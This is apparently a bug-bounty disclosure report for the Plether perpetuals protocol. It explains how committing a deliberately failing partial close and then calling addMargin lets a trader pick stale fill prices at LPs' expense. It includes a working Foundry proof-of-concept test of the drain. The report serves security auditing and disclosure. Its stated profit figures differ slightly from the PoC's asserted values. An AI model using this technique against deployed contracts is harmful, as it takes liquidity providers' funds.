# \#99777 [SC-Low] Post-commit `addMargin` lets a trader decide after the fact whether a committed partial close executes, turning binding orders into a free option paid for by LPs

**Submitted on Nov 15th 2026 at 07:57:16 UTC by @sh15h4nk for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99777
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
A trader can commit a partial close whose `minPostPositionEquityAssets` floor is set just above what the close would actually leave. Commit admission never checks that floor, so the order is accepted even though it is designed to fail. The fill price is then fixed to the first Pyth tick after `commitTime`. The trader watches the market move on from that tick. If closing at the old price turns out to be favorable, the trader calls `CfdEngine.addMargin`. Because the equity bound is evaluated against live margin at execution time, that top-up makes the same committed order valid, and the trader executes it at the stale price. If closing turns out to be unfavorable, the trader does nothing and the order fails terminally at no cost, because close orders pay zero execution bounty. With two opposite-side accounts (a market-neutral pair), the trader keeps only the favorable outcomes. The value of the price move after the fill tick moves from the LP pool to the attacker. This breaks the protocol's stated guarantee that binding orders "prevent traders from turning queued intents into free options" (`SECURITY.md:658-659`).


## Vulnerability Details

### 1. Commit admission does not evaluate the equity floor

For a close request, `commitOrder` only runs `_validateCloseAdmission`:

```solidity
// router/OrderLiquidationBatchLogic.sol:234-237
if (request.isClose) {
    _validateCloseAdmission(host, account, request.side, request.sizeDelta);
} else { ... }
```

```solidity
// router/OrderLiquidationBatchLogic.sol:344-365
function _validateCloseAdmission(...) private view {
    QueuedPositionView memory queuedPosition = _queuedPosition(host, engine, account);
    OrderValidationLib.validateCloseCommit(
        queuedPosition.exists, queuedPosition.size, queuedPosition.side, side, sizeDelta
    );
    uint256 commitPrice = _commitReferencePrice(engine);
    if (sizeDelta < queuedPosition.size
        && (sizeDelta / CfdTypes.SIZE_QUANTUM) * commitPrice < host.minOpenNotionalAssets()) {
        revert OrderRouter__CommitValidation(11);
    }
}
```

These checks cover existence, side, size and minimum partial-close notional. `_validateFreshRequest` (`:270-318`) validates the shape of the bounds and requires only `maxPostLeverageBps != 0`. Nothing projects the close against current margin or rejects a request whose `minPostPositionEquityAssets` cannot be met. Commitment also records no collateral snapshot.

### 2. `addMargin` can be called while a close is pending

```solidity
// CfdEngine.sol:501-528
function addMargin(address account, uint256 amount) external nonReentrant {
    if (msg.sender != account) revert CfdEngine__NotAccountOwner();
    if (amount == 0) revert CfdEngine__ZeroAmount();
    StoredPosition storage pos = _positions[account];
    if (pos.lots == 0) revert CfdEngine__NoOpenPosition();
    ...
    clearinghouse.lockPositionMargin(account, amount);
    _sideState(pos.side).totalMargin += amount;
    _syncPositionBorrowBaseToMargin(pos, marginBefore + amount);
    ...
}
```

There is no check for pending orders, price regime or consistency with a committed intent. The owner can raise the position margin at any time between commit and execution.

### 3. The equity bound is evaluated against live margin at execution

At execution, the close assessment is built from the live position, so `posMarginAfter` includes any margin added after commit:

```solidity
// CfdOrderPolicyEvaluatorBase.sol:439, 457
assessment.postPositionMarginAssets = delta.posMarginAfter;
...
projectedPosition.margin = delta.posMarginAfter;
```

The resulting `postPositionEquityAssets` is then compared with the committed floor:

```solidity
// CfdOrderPolicyEvaluatorBase.sol:527-538
if (fullClose) return;
uint256 normalizedEquityAssets =
    assessment.postPositionEquityAssets > 0 ? uint256(assessment.postPositionEquityAssets) : 0;
if (assessment.postPositionEquityAssets < 0 || normalizedEquityAssets < bounds.minPostPositionEquityAssets) {
    revert ICfdOrderPolicyEvaluator.CfdOrderPolicyEvaluator__ConstraintViolation(
        OrderV3Types.ConstraintKind.PostPositionEquity, normalizedEquityAssets, bounds.minPostPositionEquityAssets
    );
}
```

If the trader does not top up, the sidecar classifies this revert as terminal `ConstraintViolation` (`OrderRouterExecutionSidecar.sol:879-893`) and the order is discarded. If the trader does top up, the identical committed order passes.

### 4. The fill price is already fixed when the trader decides

Live-market execution uses Pyth's unique historical parse over `(commitTime, commitTime + orderSettlementWindow]` (`orderSettlementWindow = 15`, `PletherOracle.sol:87`). The fill tick is therefore known within seconds of commit. The order stays executable until `commitTime + executionWindowSeconds`, which is up to `maxExecutionWindowSeconds` (default 60s, governance maximum 1h). During that window the trader can observe later public prices before deciding whether to make the order valid.

### 5. Doing nothing costs the trader nothing

Close orders carry no execution bounty ("Close execution bounty: Always zero", `DEPLOYMENT.md:150`; `SECURITY.md:732`). A failed close moves no value from the trader. `SECURITY.md:1353-1355` also says failed closes require unpaid cleanup and that the protocol does not guarantee a positive keeper incentive to clear them, so nobody is paid to terminate the order early. The only cost of not exercising is gas.

### Putting it together

| Market after the fill tick | Trader action | Result |
| --- | --- | --- |
| Closing at the fill price is favorable | `addMargin`, then `executeOrder` (atomically from a smart account if desired) | Partial close fills at the earlier, better price |
| Closing at the fill price is unfavorable | Nothing | Order fails terminally with `PostPositionEquity`; no cost |


## Impact Details

The attacker holds a market-neutral pair: a LONG in account A and an equal SHORT in account B. For each window, the attacker commits a deliberately invalid partial close on one leg. If the price then moves against that leg, the attacker tops up and executes the close at the earlier fill tick, so that part of the leg exits before the adverse move. The opposite leg keeps the full gain of that move. The net effect is that LPs pay `closed size × adverse move` that the attacker would otherwise have lost. If the price moves the other way, the attacker lets the order fail and loses nothing.

- **LP loss per exercise** ≈ `q × |ΔP|`, where `q` is the closed size and `ΔP` is the price move between the fill tick and the attacker's subsequent exit.
- **Attacker cost per exercise:** the 0.04% execution fee on the closed notional, plus the fee to rebalance the pair later. VPI is signed: reducing skew earns a rebate. Gas is negligible on Arbitrum. Unexercised attempts cost only gas.
- **Break-even:** under release parameters, roughly an adverse move of about 0.08% plus any VPI cost, within the execution window. Every larger move is profit, and losses are capped at zero. The value scales linearly with position size, and the attacker can repeat it every window indefinitely.

The PoC below uses the release risk parameters (`vpiFactor = 0.01e18`, maintenance/initial margin 10/20 bps, `baseCarryBps = 500`). It shows:

- LP cash in `HousePool` decreases by **997.190620 USDG**;
- the attacker's combined clearinghouse balance increases by **970.390618 USDG** relative to starting capital, after all opening and closing fees, VPI and carry.

The PoC uses a $0.80 → $0.90 move to make the transfer easy to read. That move is illustrative and much larger than a typical one-minute move in the FX basket. The mechanism does not depend on its size: the transfer is linear in `q × ΔP`, so realistic moves (macro releases, central-bank announcements, FX session opens) at larger sizes produce the same loss pattern. Under the program's rules, frequency and opportunity size affect payout, not the impact class. The funds taken are LP principal held by the `HousePool`, which is **direct theft of user funds**.

Feasibility note: the pending order sits in the global FIFO, so another keeper executing later orders may terminate it before the attacker exercises. This limits how often the attack works but does not prevent it. When the order survives, the attacker can top up and execute atomically from a smart account.


## References

- `addMargin`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L501-L528
- Close admission: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L344-L365
- Commit bound validation: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L270-L318
- Close assessment using live margin: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L389-L471
- Equity-bound enforcement: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L490-L539
- Terminal classification: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L879-L893
- Historical fill window: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L596-L643
- Documented commit checks ("the caller's financial bounds"): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L634-L635
- Global FIFO execution from the queue head: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L365
- Stated invariant ("prevent traders from turning queued intents into free options"): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L658-L659
- Zero close bounty: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L150


## Proof of Concept

## Proof of Concept
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";

/// @notice Every position is opened, partially closed and unwound through the production V3
///         `OrderRouter.commitOrder(OrderRequest)` / `executeOrder` paths. No trusted role is pranked:
///         the only callers are the two attacker accounts and an unprivileged keeper.
contract H2PostCommitMarginOptionPoC is BasePerpTest {

    address private constant LONG_TRADER = address(0xA11CE);
    address private constant SHORT_TRADER = address(0xB0B);
    address private constant KEEPER = address(0xC0FFEE);

    uint256 private constant ENTRY_PRICE = 80_000_000; // $0.80
    uint256 private constant EXIT_PRICE = 90_000_000; // $0.90
    uint256 private constant POSITION_SIZE = 20_000e18;
    uint256 private constant HALF_SIZE = 10_000e18;
    uint256 private constant INITIAL_MARGIN = 4000e6;
    uint256 private constant POST_COMMIT_MARGIN = 3000e6;
    uint256 private constant TRADER_FUNDING = 20_000e6;

    uint256 private clientNonce;

    // Release risk parameters from packages/perps/DEPLOYMENT.md.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function test_PostCommitMarginMakesSameCloseOptionalAndExtractsLpCash() public {
        _fundTrader(LONG_TRADER, TRADER_FUNDING);
        _fundTrader(SHORT_TRADER, TRADER_FUNDING);
        uint256 attackerAssetsBeforeOpening = _attackerAssets();

        // 1. A market-neutral pair, opened through the public router like any trader would.
        _commitAndExecute(LONG_TRADER, _openRequest(CfdTypes.Side.LONG), ENTRY_PRICE);
        _commitAndExecute(SHORT_TRADER, _openRequest(CfdTypes.Side.SHORT), ENTRY_PRICE);
        (uint256 longSize,,,,,,) = engine.positions(LONG_TRADER);
        (uint256 shortSize,,,,,,) = engine.positions(SHORT_TRADER);
        assertEq(longSize, POSITION_SIZE, "LONG opened through router");
        assertEq(shortSize, POSITION_SIZE, "SHORT opened through router");

        uint256 attackerAssetsAfterOpening = _attackerAssets();
        uint256 lpCashBeforeOption = settlementToken.balanceOf(address(pool));

        // 2. Commit a partial close whose equity floor the close cannot meet. Commit admission accepts it.
        OrderV3Types.OrderRequest memory request = _invalidPartialClose();
        vm.prank(LONG_TRADER);
        uint64 orderId = router.commitOrder(request);

        // 3. The unique first post-commit tick is $0.80; the public Pyth price then moves to $0.90.
        bytes[] memory historicalTick = _mockPythUpdateData(ENTRY_PRICE);
        vm.warp(vm.getBlockTimestamp() + 1);
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(EXIT_PRICE)), int32(-8), vm.getBlockTimestamp());
        assertEq(
            uint256(uint64(baseMockPyth.getPriceUnsafe(_basePythFeedIds()[0]).price)),
            EXIT_PRICE,
            "later public price is known before the margin choice"
        );

        uint256 committedState = vm.snapshotState();

        // Counterfactual A (do nothing): any keeper terminalizes the order at no cost to the trader.
        _startRecordingLogs();
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory failed = router.executeOrder(orderId, historicalTick);
        OrderV3Types.OrderReceipt memory failedReceipt =
            _verifiedReceipt(IOrderLifecycleBook(address(router.lifecycleBook())), orderId);

        assertEq(uint8(failed.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(failed.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(uint8(failedReceipt.failure.constraint), uint8(OrderV3Types.ConstraintKind.PostPositionEquity));
        assertLt(
            failedReceipt.failure.actual,
            request.bounds.minPostPositionEquityAssets,
            "close must be deliberately invalid at commitment"
        );
        assertEq(_attackerAssets(), attackerAssetsAfterOpening, "not exercising costs the trader nothing");

        // Baseline: unwind the untouched pair at the public $0.90. A neutral pair transfers nothing net from LPs.
        _commitAndExecute(LONG_TRADER, _closeRequest(CfdTypes.Side.LONG, POSITION_SIZE), EXIT_PRICE);
        _commitAndExecute(SHORT_TRADER, _closeRequest(CfdTypes.Side.SHORT, POSITION_SIZE), EXIT_PRICE);
        int256 baselineLpDelta = int256(settlementToken.balanceOf(address(pool))) - int256(lpCashBeforeOption);
        int256 baselineAttackerDelta = int256(_attackerAssets()) - int256(attackerAssetsBeforeOpening);
        assertGe(baselineLpDelta, 0, "without the option LPs do not lose cash");
        assertLt(baselineAttackerDelta, 0, "without the option the pair only pays fees");

        // Counterfactual B (exercise): from the identical committed state, the trader tops up and executes.
        assertTrue(vm.revertToState(committedState));
        vm.prank(LONG_TRADER);
        engine.addMargin(LONG_TRADER, POST_COMMIT_MARGIN);

        _startRecordingLogs();
        vm.prank(LONG_TRADER);
        OrderV3Types.ExecutionResult memory executed = router.executeOrder(orderId, historicalTick);
        OrderV3Types.OrderReceipt memory executedReceipt =
            _verifiedReceipt(IOrderLifecycleBook(address(router.lifecycleBook())), orderId);

        assertEq(uint8(executed.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(uint8(executed.terminalReason), uint8(OrderV3Types.TerminalReason.Executed));
        assertEq(executedReceipt.executionPrice, ENTRY_PRICE, "same committed historical fill");
        assertGe(
            uint256(executedReceipt.economics.postPositionEquityAssets),
            request.bounds.minPostPositionEquityAssets,
            "post-commit margin alone crosses the stored bound"
        );
        (uint256 remainingLongSize,,,,,,) = engine.positions(LONG_TRADER);
        assertEq(remainingLongSize, HALF_SIZE);

        // Unwind the rest of the pair at the public $0.90, through the router.
        _commitAndExecute(LONG_TRADER, _closeRequest(CfdTypes.Side.LONG, HALF_SIZE), EXIT_PRICE);
        _commitAndExecute(SHORT_TRADER, _closeRequest(CfdTypes.Side.SHORT, POSITION_SIZE), EXIT_PRICE);
        (longSize,,,,,,) = engine.positions(LONG_TRADER);
        (shortSize,,,,,,) = engine.positions(SHORT_TRADER);
        assertEq(longSize + shortSize, 0, "pair fully unwound");

        int256 exercisedLpDelta = int256(settlementToken.balanceOf(address(pool))) - int256(lpCashBeforeOption);
        int256 exercisedAttackerDelta = int256(_attackerAssets()) - int256(attackerAssetsBeforeOpening);

        emit log_named_int("LP cash delta, baseline (no exercise)", baselineLpDelta);
        emit log_named_int("LP cash delta, exercised", exercisedLpDelta);
        emit log_named_int("Attacker net vs starting capital, baseline", baselineAttackerDelta);
        emit log_named_int("Attacker net vs starting capital, exercised", exercisedAttackerDelta);

        assertEq(baselineLpDelta, 2_894_212, "baseline: LPs earn fees");
        assertEq(baselineAttackerDelta, -30_494_214, "baseline: attacker pays fees, keeper bounties and VPI");
        assertEq(exercisedLpDelta, -997_190_619, "LPs fund the selectively exercised close");
        assertEq(
            exercisedAttackerDelta, 969_990_617, "attacker is net profitable after all fees, bounties, VPI and carry"
        );
    }

    // --- Public-path helpers ---

    function _commitAndExecute(
        address trader,
        OrderV3Types.OrderRequest memory request,
        uint256 price
    ) private {
        vm.prank(trader);
        uint64 id = router.commitOrder(request);
        bytes[] memory update = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, update);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "router order executes");
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _attackerAssets() private view returns (uint256) {
        return clearinghouse.balanceAssets(LONG_TRADER) + clearinghouse.balanceAssets(SHORT_TRADER);
    }

    function _openRequest(
        CfdTypes.Side side
    ) private returns (OrderV3Types.OrderRequest memory request) {
        request = _baseRequest(side, POSITION_SIZE, false);
        request.marginDelta = INITIAL_MARGIN;
    }

    function _closeRequest(
        CfdTypes.Side side,
        uint256 size
    ) private returns (OrderV3Types.OrderRequest memory request) {
        request = _baseRequest(side, size, true);
    }

    function _invalidPartialClose() private returns (OrderV3Types.OrderRequest memory request) {
        request = _baseRequest(CfdTypes.Side.LONG, HALF_SIZE, true);
        request.targetPrice = ENTRY_PRICE;
        request.bounds.minPostPositionEquityAssets = 3000e6; // deliberately above the equity the close would leave
    }

    /// @dev Permissive slippage target in the same direction convention as the repository's router tests.
    function _baseRequest(
        CfdTypes.Side side,
        uint256 size,
        bool isClose
    ) private returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256(abi.encode("H-2", ++clientNonce));
        request.side = side;
        request.sizeDelta = size;
        request.isClose = isClose;
        request.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

}

```
